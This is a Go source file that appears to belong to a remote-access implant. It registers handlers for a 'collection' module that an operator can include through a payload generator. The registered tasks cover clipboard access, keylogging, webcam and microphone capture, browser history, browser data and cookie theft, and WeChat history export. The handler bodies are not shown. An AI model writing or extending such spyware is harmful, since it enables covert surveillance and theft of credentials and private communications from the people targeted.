//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Task registry: the optional "collection" module (see
// internal/payload/agent_modules.go). The generator drops this file whole
// when the operator excludes the module; every entry point below disappears
// with it and the linker dead-codes the unreferenced handlers.

func init() {
	taskHandlers["clipboard_get"] = handleClipboardGet
	taskHandlers["clipboard_set"] = handleClipboardSet
	taskHandlers["keylogger_start"] = handleKeyloggerStart
	taskHandlers["keylogger_stop"] = handleKeyloggerStop
	taskHandlers["keylogger_dump"] = handleKeyloggerDump
	taskHandlers["webcam"] = handleWebcam
	taskHandlers["mic"] = handleMic
	taskHandlers["browser_history"] = handleBrowserHistory
	taskHandlers["browser_steal"] = handleBrowserSteal
	taskHandlers["cookie_export"] = handleCookieExport
	taskHandlers["wechat_history"] = handleWeChatHistory
}
